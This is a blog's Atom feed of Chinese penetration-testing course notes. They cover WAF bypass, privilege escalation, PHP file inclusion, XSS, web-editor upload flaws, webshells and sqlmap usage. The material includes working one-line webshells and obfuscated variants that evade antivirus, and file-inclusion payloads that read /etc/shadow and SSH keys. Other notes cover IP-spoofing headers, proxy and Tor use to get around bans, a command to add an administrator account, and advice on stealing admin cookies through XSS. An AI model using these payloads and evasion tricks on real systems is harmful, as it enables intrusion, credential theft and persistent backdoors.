<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://itxz.fun</id>
    <title>pony686</title>
    <updated>2020-10-04T02:04:28.916Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://itxz.fun"/>
    <link rel="self" href="https://itxz.fun/atom.xml"/>
    <subtitle>pony686</subtitle>
    <logo>https://itxz.fun/images/avatar.png</logo>
    <icon>https://itxz.fun/favicon.ico</icon>
    <rights>All rights reserved 2020, pony686</rights>
    <entry>
        <title type="html"><![CDATA[25  waf 绕过的讲解]]></title>
        <id>https://itxz.fun/post/25-waf-rao-guo-de-jiang-jie/</id>
        <link href="https://itxz.fun/post/25-waf-rao-guo-de-jiang-jie/">
        </link>
        <updated>2020-10-03T23:06:21.000Z</updated>
        <content type="html"><![CDATA[<p>网站的防护：<br>
1.源码自带的防护代码  （ 注入，上传，xss，等存在拦截）<br>
2.软件WAF   （ 各种web漏洞 提权组件  owasp top 10  ，访问速度，指纹拦截）<br>
sqlmap 识别了你的指纹  sqlmap 。org 注入语句即使过waf 也会拦截<br>
安全狗/D盾/云锁/云盾/360 等waf</p>
<p>安全狗   （你执行的注入语句 检测出来拦截，不会封锁你ip，<br>
认为你是cc攻击 （目录扫描速度过快，sqlmap跑注入 速度过快 会认为你是在cc攻击）<br>
10/100   ip封锁五分钟<br>
3.硬件WAF<br>
硬件 主要防御流量和一些web攻击<br>
注入 天融信    防火墙会封锁ip<br>
阿里云 硬件waf （不光拦截web漏洞攻击，速度过快 ddos 拦截）<br>
1个小时 封锁ip<br>
是通过http请求 还是通过tcp 的ip来封锁的<br>
如果是通过http请求头来获取ip封锁的，那么<br>
client-ip: 1.1.1.1<br>
x-forward-for:  1.1.1.1</p>
<p>如果是基于tcp获取ip封锁的情况下躲避拦截：<br>
用代理（换ip来访问)<br>
我们可以使用代理池（几十万的ip，验证完，吧这些ip到处来）</p>
<p>4.云WAF</p>
<p>waf<br>
web appcation  firewall</p>
<p>1.一定注意软件的 指纹信息清理或者修改</p>
<p>waf 拦截两个方向：<br>
1.基于ip封锁（cc攻击 ddos等态势感知）<br>
2.基于web应用攻击（web漏洞攻击拦截，指纹）</p>
<p>通用型防护代码：<br>
1.注入 上传xss</p>
<ol>
<li>大小写替换<br>
2.变换提交方式（get/post/cookie）<br>
3.编码绕过（url编码，基于语句重叠，注释符号等等）</li>
</ol>
<p>d盾<br>
注入   上传   webshell  菜刀</p>
<p>ngx_lua_waf</p>
<p>wts -WAF</p>
<p>iis7.0</p>
<p>目录扫描：<br>
指纹<br>
速度<br>
ip封锁</p>
<p>搞个代理池 十万个代理ip 验证<br>
8w ip</p>
<p>sqlmap  --proxy-file=c:\1.txt</p>
<p>timeout 30<br>
飘红一次<br>
三次</p>
<p>90s</p>
<p>依然会很慢</p>
<p>阿里云<br>
sqlmap --tor  --proxy-type=socks5</p>
<p>配合kali来用tor代理</p>
<p>admin/<br>
403<br>
501<br>
500<br>
401</p>
<p>xss</p>
<p>你要探测它是否是通过tcp ip限制<br>
remote-ip<br>
还是 http</p>
<p>X-Forwarded-For:159.97.29.246<br>
X-Forwarded-Host:159.97.29.246<br>
X-Client-IP:159.97.29.246<br>
X-remote-IP:159.97.29.246<br>
X-remote-addr:159.97.29.246<br>
True-Client-IP:159.97.29.246<br>
X-Client-IP:159.97.29.246<br>
Client-IP:159.97.29.246<br>
X-Real-IP:159.97.29.246</p>
<p>xss  写管理员登录的ip</p>
<p>xss 打过来之后 管理员的ip  如果是外网浙江220.18.4.10<br>
s5  911.re   全世界各地ip段都有<br>
可以找一些这个段的ip</p>
<p>3389 怎么突破  3389 访问这个ip220.18.4.10<br>
可以使用端口转发<br>
lcx  转发到vps  链接vps的端口就可以了<br>
msf  建立链接之后 portfwd add  端口转发</p>
<p>方法：<br>
1大小写变种<br>
2使用SQL注释<br>
3使用URL编码<br>
4使用空字节<br>
5使用嵌套过剥离<br>
6使用非标准入口点<br>
7避开自定义过滤器</p>
<p>1.url参数污染<br>
（1.可以用注释和空字符和内联注释来进行污染）<br>
access  asp<br>
%0a %od %09 %20<br>
%%%%%0a  代替空格可以够宝塔  WTS<br>
+号也可以代替空格  可以过360</p>
<p>--</p>
<h1 id=""></h1>
<p>%23<br>
/**/<br>
/<em>!50001</em>/<br>
加载字典跑</p>
<p>（2.可以使用长度来进行污染）可以使用垃圾字符 增加提交内容长度<br>
waf 拦截长度是有一定的限制</p>
<p>长度污染 （一般用是post提交的时候，上传的时候）</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[22 权限提升讲解]]></title>
        <id>https://itxz.fun/post/22-quan-xian-ti-sheng-jiang-jie/</id>
        <link href="https://itxz.fun/post/22-quan-xian-ti-sheng-jiang-jie/">
        </link>
        <updated>2020-09-30T12:56:06.000Z</updated>
        <content type="html"><![CDATA[<p>各种漏洞拿到shell<br>
获取webshell权限，可以对网站任意修改<br>
获取服务的管理员权限（系统权限）<br>
1.网络服务用户权限<br>
2.webshell（对网站修改）<br>
3.(系统权限)（管理权限 system rootquan）</p>
<p>提权 提升权限</p>
<p>ASP/php 匿名权限</p>
<p>ASPx USER权限</p>
<p>jsp 通常是系统权限</p>
<p>注意： 在脚本允许的情况下可以变换脚本提权</p>
<p>收集信息<br>
内外网<br>
服务器系统和版本 位数<br>
服务器的补丁情况<br>
服务器的安装软件情况<br>
服务器的防护软件情况<br>
端口情况<br>
支持脚本情况<br>
...........<br>
信息收集常用命令<br>
windows：<br>
ipconfig /all 查看当前ip<br>
net user 查看当前服务器账号情况<br>
netstat -ano 查看当前服务器端口开放情况<br>
ver 查看当前服务器操作系统<br>
systeminfo 查看当前服务器配置信息（补丁情况）<br>
tasklist /svc 查看当前服务器进程情况<br>
taskkill -PID pid号 结束某个pid号的进程<br>
taskkill /im qq.exe /f  结束qq进程<br>
net user cracer cracer /add 添加一个用户名为cracer密码为cracer的用户<br>
net localgroup administrators cracer /add 将用户cracer添加到管理员组<br>
whoami 查看当前操作用户（当前权限）<br>
linux：</p>
<p>ls -al 查看当前目录下的文件和文件夹</p>
<p>pwd 查看当前操作路径</p>
<p>uname -a 查看当前服务器内核信息</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[18php 常见的漏洞]]></title>
        <id>https://itxz.fun/post/18php-chang-jian-de-lou-dong/</id>
        <link href="https://itxz.fun/post/18php-chang-jian-de-lou-dong/">
        </link>
        <updated>2020-09-25T09:40:35.000Z</updated>
        <content type="html"><![CDATA[<p>01 文件包含漏洞<br>
文件包含<br>
程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，<br>
而无需再次编写，这中文件调用的过程一般被称为文件包含。<br>
程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，<br>
但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。<br>
几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,<br>
而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。<br>
在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。<br>
常见文件包含函数<br>
include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行<br>
require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本<br>
include_once()和require_once()：若文件中代码已被包含则不会再次包含<br>
程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件<br>
用户能够控制该动态变量</p>
<p>漏洞危害<br>
执行任意代码<br>
包含恶意文件控制网站<br>
甚至控制服务器</p>
<p>漏洞分类<br>
本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码<br>
上传图片马，然后包含<br>
读敏感文件，读PHP文件<br>
包含日志文件GetShell<br>
包含/proc/self/envion文件GetShell<br>
包含data:或php://input等伪协议<br>
若有phpinfo则可以包含临时文件<br>
远程文件包含：可以直接执行任意代码<br>
要保证php.ini中allow_url_fopen和allow_url_include要为On</p>
<p>漏洞挖掘<br>
通过白盒代码审计<br>
黑盒工具挖掘<br>
awvs appscan burp<br>
w3af</p>
<p>本地包含漏洞<br>
文件包含漏洞利用的条件<br>
1 include()等函数通过动态变量的方式引入需要包含的文件<br>
2 用户能控制该动态变量</p>
<?php 
$test=$_GET['c'];
include($test);
?>
<p>保存为 include.php<br>
在同一个目录下创建test.txt 内容为</p>
<?php phpinfo() ?>
<p>访问测试  //http://127.0.0.1/test/include.php?c=test.txt    //访问连接，将123.txt传送给c并赋给test变量</p>
<p>本地包含漏洞注意事项<br>
相对路径<br>
../../../etc/passwd<br>
%00截断包含(PHP&lt;5.3.4)</p>
<?php
      include $_GET[x].'.php';
	  echo $_GET[x].'.php';
?>
<p>magic_quotes_gps=off 才可以，否则%00会被转义</p>
<p>截断绕过<br>
?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.<br>
(php版本小于5.2.8(?)可以成功<br>
?file=../../../../../../../../../boot.ini/………[…]…………<br>
(php版本小于5.2.8(?)可以成功，只适用windows<br>
其他绕过<br>
dvwa中级难度的包含，这个主要是过滤了远程文件包含和我们目录的跳转，大小写混合输入就可以绕过远程文件包含的过滤<br>
目录跳转的过滤我们可以构造….//….//xxx.php，方式绕过，由于他只过滤一次，我们可以利用他的过滤动态拼接目录跳转，从而绕过过滤</p>
<p>利用技巧<br>
上传图片马，马包含的代码为<?fputs(fopen("shell.php","w"),"<?php eval($_POST[x]);?>&quot;)?&gt;，<br>
上传后图片路径为/uploadfile/x.jpg，当访问<br>
http://www.cracer.com/xx.php?page=uploadfile/x.jpg时，<br>
将会在fi这个文件夹下生成shell.php,内容为<?php eval($_POST[x); ?></p>
<p>读敏感文件<br>
Windows：<br>
C:\boot.ini  //查看系统版本<br>
C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件<br>
C:\Windows\repair\sam  //存储系统初次安装的密码<br>
C:\Program Files\mysql\my.ini  //Mysql配置<br>
C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root<br>
C:\Windows\php.ini  //php配置信息<br>
C:\Windows\my.ini  //Mysql配置信息<br>
Linux：<br>
/root/.ssh/authorized_keys<br>
/root/.ssh/id_rsa<br>
/root/.ssh/id_ras.keystore<br>
/root/.ssh/known_hosts<br>
/etc/passwd<br>
/etc/shadow<br>
/etc/my.cnf<br>
/etc/httpd/conf/httpd.conf<br>
/root/.bash_history<br>
/root/.mysql_history<br>
/proc/self/fd/fd[0-9]*(文件标识符)<br>
/proc/mounts<br>
/porc/config.gz<br>
包含日志(主要是得到日志的路径)<br>
读日志路径：<br>
文件包含漏洞读取apache配置文件<br>
index.php?page=/etc/init.d/httpd<br>
index.php?page=/etc/httpd/conf/httpd.conf<br>
默认位置/var/log/httpd/access_log</p>
<p>包含日志(主要是得到日志的路径)<br>
日志会记录客户端请求及服务器响应的信息，访问http://www.xx.com/<?php phpinfo(); ?>时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent<br>
可以通过Burp Suite来绕过编码</p>
<p>文件包含漏洞实例<br>
制作错误，写入一句话<br>
http://127.0.0.1/ekucms/index.php?s=my/show/id/{~eval($_POST[x])}</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[xss漏洞]]></title>
        <id>https://itxz.fun/post/xss-lou-dong/</id>
        <link href="https://itxz.fun/post/xss-lou-dong/">
        </link>
        <updated>2020-09-16T14:11:35.000Z</updated>
        <content type="html"><![CDATA[<p>XSS（cross-site script）跨站脚本自1996年诞生以来，一直被OWASP(open web application security project) 评为十大安全漏洞中的第二威胁漏洞。也有黑客把xss当做新型的“缓冲区溢出攻击”，而JavaScript是新型的shellcode。<br>
2011年6月份，国内最火的信息发布平台“新浪微博”爆发了xss蠕虫攻击，仅持续16分钟，感染用户近33000个，危害十分严重。<br>
xss最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。</p>
<p>什么是跨站脚本？<br>
是一种经常出现在web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段。<br>
跨站脚本实例</p>
<html>
<head>xss test</head>
<body>
<script>alert("xss")</script>
</body>
</html>
这段代码使用alert函数来执行打开一个消息框，消息框中显示xss信息
使用xss弹出恶意警告框，代码为：
<script>alert("xss")</script>
xss输入也可能是html代码段，如果使网页不停的刷新，代码为
<meta http-equiv="refresh" content="0;">
嵌入其他网站链接的代码为：
<iframe src=http://cracer.com width=0 height=0></iframe>
<p>网络钓鱼，包括盗取各类的用户账号<br>
窃取用户cookie<br>
窃取用户浏览请回话<br>
强制弹出广告页面、刷流量<br>
网页挂马<br>
提升用户权限，进一步渗透网站<br>
传播跨站脚本蠕虫等</p>
<p>Xss分类<br>
反射型XSS<br>
DOM型xss<br>
存储型XSS</p>
<p>反射型跨站脚本也称作非持久型、参数型跨站脚本、这类型的脚本是最常见的 ，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中<br>
例如<br>
http://www.cracer.com/search.php?key=&quot;&gt;<script>alert(&quot;xss&quot;)</script><br>
一般使用的将构造好的URL发给受害者，是受害者点击触发，而且只执行一次，非持久化。</p>
<p>存在xss漏洞<br>
bc<br>
qp<br>
zjp<br>
测管理员经常上线的站点<br>
借助社工 让管理员登陆后台触发漏洞<br>
cookie 盗取   欺骗管理份登陆后台<br>
黑帽seo js代码</p>
<p>快照劫持 页面跳转 蜘蛛劫持 钓鱼 等一系列攻击<br>
根目录/首页 head 头标签里面的script代码<br>
global.ass<br>
self.xss</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[16编辑器漏洞]]></title>
        <id>https://itxz.fun/post/16-bian-ji-qi-lou-dong/</id>
        <link href="https://itxz.fun/post/16-bian-ji-qi-lou-dong/">
        </link>
        <updated>2020-09-14T09:59:15.000Z</updated>
        <content type="html"><![CDATA[<p>编辑器配合解析漏洞利用<br>
编辑器自身的漏洞利用‘</p>
<p>wordpress<br>
emlog<br>
zblog<br>
dz<br>
dedecms +eweb/fck/kindeditor/ueditor<br>
源码本身没有漏洞，编辑器可能存在漏洞<br>
挖掘编辑器  漏洞</p>
<p>1.确定编辑器<br>
网站可能存在多个编辑器<br>
0ld/<br>
bbs/<br>
端口搭建的站点 经常存在编辑器漏洞<br>
可能会存在二级目录下<br>
admin/ewebditor<br>
editor<br>
edit<br>
admin_editor<br>
在这些目录访问ewebeditor.asp/htm/html<br>
ewebeditor/kindeditor</p>
<p>fckeditor<br>
一般放在根目录<br>
有可能也放在admin目录下<br>
include目录下 ecshop cms<br>
隐藏站点：存在编辑器漏洞<br>
子站：目录站/ip端口站：<br>
www.baidu.com</p>
<p>fck ckeditor<br>
针对于版本漏洞利用<br>
fck&lt;2.6.4<br>
fck配合解析漏洞利用<br>
看网站容器有没有利用的解析漏洞</p>
<p>2，找编辑器版本对应的漏洞<br>
3。漏洞利用</p>
<p>x.asp%00.jpg<br>
2.4<br>
1.配合解析漏洞<br>
2.利用截断getshell<br>
2.5利用解析漏洞 递推创建a。asp/1.a's'p<br>
利用00截断getshell<br>
尝试两种截断<br>
a.asp%00.jpg<br>
a.asp%00.jpg<br>
如果碰到阿里云<br>
上传后的文件名改成 a_asp 还会封你ip<br>
解决办法<br>
换ip上传<br>
截短连发三个包<br>
1.a_asp<br>
2a（1）—asp<br>
3.a（1）.asp</p>
<p>2.6.4 以上的重命名 2020</p>
<p>eweb编辑器</p>
<p>PART 1:  编辑器路径查找<br>
查找编辑器目录	<br>
目录扫描<br>
目录遍历<br>
蜘蛛爬行<br>
注意事项：<br>
查找路径时应注意站中站和子站的编辑器路径<br>
如果进入后台查找编辑器未能正常显示的，可以利用审查元素搜索editor等关键字、或者<br>
换低版本浏览器打开查看编辑器<br>
漏洞利用<br>
百度相关编辑器漏洞利用<br>
查看编辑器版本-根据版本查找对应漏洞利用方法-漏洞利用<br>
平时注意收集各种编辑器漏洞利用方法</p>
<p>PART 2:  FCK编辑器漏洞<br>
FCKeditor编辑器页/查看编辑器版本/查看文件上传路径<br>
FCKeditor编辑器页 <br>
FCKeditor/_samples/default.html <br>
查看编辑器版本 <br>
FCKeditor/_whatsnew.html <br>
查看文件上传路径<br>
fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[文件上传漏洞]]></title>
        <id>https://itxz.fun/post/wen-jian-shang-chuan-lou-dong/</id>
        <link href="https://itxz.fun/post/wen-jian-shang-chuan-lou-dong/">
        </link>
        <updated>2020-09-13T14:00:05.000Z</updated>
        <content type="html"><![CDATA[<p>我们讲的上传是上传脚本<br>
iis5.6.0 容器:<br>
1.目录解析漏洞 /a.asp/x.jpg<br>
2.分号解析漏洞：uploadfiles/x.asax x.asax  也能识别aps文件<br>
iis7./7.5/8.x/10.x 　服务器０８　２０１２　２０１６<br>
如果开启了ｆａｓｔ－ｃｇｉ模板<br>
ｕｐｌｏａｄｆｉｌｅｓ／ｘ．ｊｐｇ<br>
ｕｐｌｏａｄｆｉｌｅｓ／ｘ．ｊｐｇ／．ａｓｐ　配合ｆｃｋ编辑器使用<br>
ｘ．ｐｈｐ％００．ｊｐｇ　ＩＩＳ７．ｘ　０８　ｎｇｉｎｘ版本固定漏洞<br>
ａｐａｃｈｅ：<br>
ｘ．ｐｈｐ．ｚｚｚ　配合黑名单利用<br>
ｘ．ｐｈｐ．<br>
ｘ．ｐｈｐ．ｊｐｇ　也能解析成ｐｈｐ脚本<br>
ｘ．ｐｈｐ．ｊｐｇ？ｓｉｄ＝１２３　这种居多</p>
<p>%00  截断<br>
::$data 截断php文件<br>
cracer.com/upoloadfiles/x.asp/20200510123123.jpg</p>
<p>03+iis.6<br>
08+ii7.0/7.5<br>
2012 iis8.0<br>
2016 iis10.x</p>
<p>php.3 可以解析<br>
phtml<br>
iis10.0<br>
x.jpg</p>
<p>文件上传后发生改变<br>
时间戳命名居多<br>
+白名单来限制上传<br>
asp  无明显</p>
<ol>
<li>
<p>通过前台图片分析上传路径</p>
</li>
<li>
<p>爆破工具进行爆破文件名称</p>
<p>metinfo<br>
uploadfile/20123123.jpg/.php<br>
awvs扫描到了一个上传接口 上传简历 招聘地方<br>
上传成功没回显示<br>
1.下载metinfocms 本地复现<br>
2,分析文件名命名规则<br>
3.burp抓包爆破[,]获取图片地址</p>
</li>
</ol>
<p>crcaer.com/uploadfiles/20200510123123.jpg</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[脚本木马工作的原理]]></title>
        <id>https://itxz.fun/post/jiao-ben-mu-ma-gong-zuo-de-yuan-li/</id>
        <link href="https://itxz.fun/post/jiao-ben-mu-ma-gong-zuo-de-yuan-li/">
        </link>
        <updated>2020-09-13T01:37:20.000Z</updated>
        <content type="html"><![CDATA[<p>xx.com /dama.asp</p>
<p>只是对网站有权限修改<br>
iis网络服务用户</p>
<p>webshell取决于容器间运行的权限 IIS 网络用户<br>
apache apache用户<br>
提权 system</p>
<p>免杀问题</p>
<p>safedog<br>
d盾<br>
云锁<br>
360<br>
阿里云防护<br>
bypass<br>
免杀<br>
www.cracer.com/x.txt<br>
a.php<br>
&lt;% execute request(&quot;valuer&quot;)%&gt;</p>
<p>x.asp<br>
x.php<br>
x.jpg</p>
<p>webshell的种类<br>
一句话木马<br>
小马<br>
大马<br>
打包马<br>
脱裤马<br>
等等<br>
PART 2:  WEBSHELL 工作原理</p>
<p>介绍：<br>
一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。</p>
<p>&lt;%execute request(&quot;value&quot;)%&gt;<br>
x.asp</p>
<p>iis容器（asp/aspx/php）<br>
cracer.com/x.php<br>
如容器支持其他脚本类型，可以上传其他脚本木马<br>
apache/nginx<br>
php<br>
asp</p>
<p>asp/aspx</p>
<p>iis容器 asp 脚本权限和aspx脚本权限一样吗<br>
aspx高一些<br>
调用cms aspx 马可以调用系统cmd<br>
jsp/tomcat/jboss weblogic administrator system root<br>
直接提权<br>
存在降权 public 网络服务用户</p>
<p>多级包含<br>
a.asp  b.asp</p>
<p>工作原理<br>
黑客在注册信息的电子邮箱或者个人主页等中插入类似如下代码：<br>
&lt;%execute request(&quot;value&quot;)%&gt;<br>
其中value是值，所以你可以更改自己的值，前面的request就是获取这个值<br>
&lt;%eval request(&quot;value&quot;)%&gt;(现在比较多见的，而且字符少，对表单字数有限制的地方特别的实用)<br>
当知道了数据库的URL，就可以利用本地一张网页进行连接得到Webshell。（不知道数据库也可以，只要知道&lt;%eval request(&quot;value&quot;)%&gt;这个文件被插入到哪一个ASP文件里面就可以了。）<br>
这就被称为一句话木马，它是基于B/S结构的。</p>
<p>常见写法<br>
asp一句话木马：<br>
&lt;%eval request(&quot;c&quot;)%&gt;<br>
php一句话木马：</p>
<?php @eval($_POST[value]);?>
<p>aspx一句话木马：<br>
&lt;%@ Page Language=&quot;Jscript&quot;%&gt;<br>
&lt;%eval(Request.Item[&quot;value&quot;])%&gt;<br>
jsp一句话<br>
&lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;<br>
一句话的使用<br>
首先,找到数据库是asp格式的网站,然后,以留言板,或者发表文章的方式,把一句话添加到asp数据库，或者加进asp网页.<br>
记住!我们的目的是把一句话&lt;%execute request(&quot;value&quot;)%&gt;添加到数据库,无论任何方式!<br>
然后打开客户端(就是你电脑上面的那个htm文件),填上加入了一句话的asp文件,或者是asp网页,然后进入此网站服务器。</p>
<p>小马<br>
小马体积小，容易隐藏，隐蔽性强，最重要在于与图片结合一起上传之后可以利用nginx或者IIS6的解析漏洞来运行，不过功能少，一般只有上传等功能。<br>
主要用来上传大马</p>
<p>大马<br>
大马体积比较大  一般50K以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接借口，执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，而大多代码如不加密的话很多杀毒厂商开始追杀此类程序<br>
大马的使用<br>
用途：<br>
提权<br>
打包<br>
脱裤<br>
增删文件<br>
等等<br>
PART 3:  一句话常见的客户端<br>
一句话最常用的客户端为：<br>
一句话客户端增强版<br>
中国菜刀<br>
中国砍刀<br>
lanker一句话客户端<br>
ZV新型PHP一句话木马客户端GUI版<br>
webacoo<br>
weveely<br>
msf 生成的aspx、asp、php、jsp、各种payload<br>
WeBaCoo (Web Backdoor Cookie) script-kit是一个小巧的、隐蔽的php后门，它提供了一个可以连接远程web服务器并执行php代码的终端。WeBaCoo使用HTTP响应头传送命令结果，shell命令经base64编码后隐藏在Cookie头中。</p>
<p>生成模式<br>
-h  查看帮助<br>
-g   生成shell文件<br>
终端模式<br>
启动<br>
webacoo -h  查看帮助<br>
生成后门</p>
<p>生成后门<br>
webacoo -g -o test.php<br>
连接<br>
webacoo -t -u http://127.0.0.1/test.php<br>
load  加载组建<br>
unload 退出<br>
Whoami 执行系统命令<br>
Exit  退出<br>
通过代理访问<br>
webacoo -t -p 127.0.0.1:8080 –uhttp://127.0.0.1/test.php</p>
<p>weevely<br>
高隐蔽性的针对php平台的webshell工具<br>
本身提供了30多种自动化扫描工具<br>
可以执行多种任务<br>
浏览文件系统，检测服务器设置，创建tcpshell和reverse shell,在<br>
被测主机上安装http代理，执行端口扫描</p>
<p>用法<br>
weevely  --help<br>
生成shell<br>
weevely generate 123123 shell.php<br>
连接 shell<br>
weevelly  htpp://127.0.0.1/shell.php  123123<br>
net.scan 127.0.0.1 20,22,23,8080,3389    扫描指定ip端口</p>
<p>PART 4:  WEBSHELL 免杀技巧<br>
使用技巧<br>
内容编码<br>
制作图片马<br>
配合解析漏洞<br>
配合文件包含</p>
<p>内容编码</p>
<?php $_REQUEST['a']($_REQUEST['b']); ?>
<p>&lt;%Eval(Request(chr(112)))%&gt;<br>
&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;xindong&quot;))%&gt;<br>
&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;<br>
&lt;%a=request(&quot;gold&quot;)%&gt;&lt;%eval a%&gt;</p>
<?php ($_=@$_GET[2]).@$_($_POST[sz])?>
<?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["sz"]); ?>
<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);?>
<?php $a = "a"."s"."s"."e"."r"."t";  $a($_POST["sz"]); ?>
<p>在菜刀里写http://localhost:8081/test/a.php?2=assert密码是sz</p>
<p>404隐藏后门</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqlmap工具的使用]]></title>
        <id>https://itxz.fun/post/sqlmap-gong-ju-de-shi-yong/</id>
        <link href="https://itxz.fun/post/sqlmap-gong-ju-de-shi-yong/">
        </link>
        <updated>2020-09-12T13:32:39.000Z</updated>
        <content type="html"><![CDATA[<p>SQLMAP介绍<br>
sqlmap 是一个由Python语言编写的开源渗透测试工具，它主要用来检测sql注入漏洞，是一款功能强大的sql漏洞检测利用工具。</p>
<p>它可以检测的数据库有：access、mssql、mysql、oracle、postgresql、db2、sqlite等<br>
可以进行 sql盲注、union查询、显错注入、延迟注入、post注入、cookie注入等<br>
其他功能:<br>
执行命令、列举用户、检测权限、自动破解、数据导出等功能。</p>
<p>sqlmap的安装<br>
下载地址：<br>
http://www.sqlmap.org<br>
安装<br>
首先需要安装python2.7 环境</p>
<p>直接解压即可<br>
更新<br>
sqlmap.py --update</p>
<p>基本参数<br>
Sqlmap.py  -h 查看帮助选项<br>
is-dba			当前用户权限<br>
dbs				所有数据库<br>
current-db			网站当前数据库<br>
users			所有数据库用户<br>
current-user		当前数据库用户<br>
tables			参数:列表名<br>
columns			参数:列字段<br>
dump			参数:下载数据</p>
<p>--dump 			获取表中的数据，包含列<br>
--dump-all			转存DBMS数据库所有表项目<br>
--level			测试等级(1-5)，默认为1<br>
读取数据库---&gt;读取表----&gt;读取表的列----&gt;获取内容</p>
<p>-D  			指定数据库<br>
-T			指定表<br>
-C			指定列<br>
--dbms=mysql  oracle mssql     	指定数据库</p>
<p>--users	枚举所有用户<br>
--passwords	枚举所有用户密码<br>
--roles	列出数据库管理员角色<br>
--privileges 	列出数据库管理员权限</p>
<p>列举数据库系统的架构<br>
sqlmap.py -u &quot;http://xx.com/int.php?id=1&quot; --schema --batch --exclude-sysdbs</p>
<p>参数：--level</p>
<p>共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。<br>
这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。<br>
总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p>
<p>-v  显示调试信息 有7个级别</p>
<p>0、只显示python错误以及严重的信息。<br>
1、同时显示基本信息和警告信息。（默认）<br>
2、同时显示debug信息。<br>
3、同时显示注入的payload。<br>
4、同时显示HTTP请求。<br>
5、同时显示HTTP响应头。<br>
6、同时显示HTTP响应页面。</p>
<p>风险等级<br>
参数：--risk</p>
<p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>
<p>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>
<p>测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p>
<p>获取目标<br>
参数：-u或者--url<br>
格式：http(s)😕/targeturl[:port]/[…]<br>
例如：python sqlmap.py -u http://www.target.com/vuln.php?id=1</p>
<p>参数：-u或者--url<br>
格式：http(s)😕/targeturl[:port]/[…]<br>
例如：python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1</p>
<p>从文本中获取多个目标扫描<br>
参数：-m<br>
文件中保存url格式如下，sqlmap会一个一个检测<br>
www.target1.com/vuln1.php?q=foobar<br>
www.target2.com/vuln2.asp?id=1<br>
www.target3.com/vuln3/id/1*</p>
<p>参数：-r<br>
sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。</p>
<p>比如文本文件内如下：</p>
<p>POST /vuln.php HTTP/1.1<br>
Host: www.target.com<br>
User-Agent: Mozilla/4.0<br>
id=1</p>
<p>处理google结果<br>
参数：-g</p>
<p>sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。</p>
<p>例子：</p>
<p>python sqlmap.py -g &quot;inurl:php?id=&quot;</p>
<p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p>
<p>例子：</p>
<p>python sqlmap.py -u “http://www.cracer.com/cracer.php” --data=“id=1”</p>
<p>--param-del<br>
参数拆分字符</p>
<p>当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p>
<p>例子：<br>
